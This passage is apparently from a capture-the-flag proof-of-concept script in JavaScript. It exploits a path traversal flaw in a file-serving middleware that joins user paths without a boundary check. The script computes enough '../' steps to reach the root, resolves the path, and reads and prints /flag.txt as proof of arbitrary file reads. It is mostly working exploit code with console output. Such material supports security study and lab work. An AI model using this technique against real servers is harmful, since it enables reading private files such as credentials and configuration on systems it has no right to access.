  // The middleware constructs the target filesystem path using:
  //   let fullRequestPath = path.join(directory, requestPath);
  // It completely omits a security boundary check (e.g., verifying that 
  // fullRequestPath resolves within the intended `directory` sandbox). 
  // Because `path.join` performs raw string normalization without sanitizing 
  // relative traversal sequences (`../`), attacker-controlled input can 
  // escape the working directory and reference arbitrary system files.

  const baseDirectory = process.cwd();

  // Dynamically calculate the exact number of upward traversals needed to 
  // escape any working directory depth and land at the filesystem root.
  const depthToRoot = baseDirectory.split('/').length + 2;
  const maliciousRequestPath = `${'../'.repeat(depthToRoot)}flag.txt`;

  console.log(`[+] Simulated crafted URL path: ${maliciousRequestPath}`);
  console.log(`[!] Intended sandbox directory: ${baseDirectory}\n`);

  // Reproduce the exact vulnerable code path from the middleware
  const resolvedFullRequestPath = path.join(baseDirectory, maliciousRequestPath);

  console.log(`[!] Resolved absolute filesystem path: ${resolvedFullRequestPath}`);
  console.log(`[!] Expected target: /flag.txt\n`);

  // Simulate the middleware's subsequent file read operation (yield readFile())
  const stat = fs.lstatSync(resolvedFullRequestPath);
  if (!stat.isFile()) {
    throw new Error('Path traversal failed: resolved path does not point to a file.');
  }

  const protectedContent = fs.readFileSync(resolvedFullRequestPath, 'utf8');

  console.log('[✓] VULNERABILITY CONFIRMED: Path traversal successfully bypassed base directory restrictions.');
  console.log(`[#] Arbitrary file /flag.txt read successfully:\n---\n${protectedContent}\n---\n`);
}

await exploit();
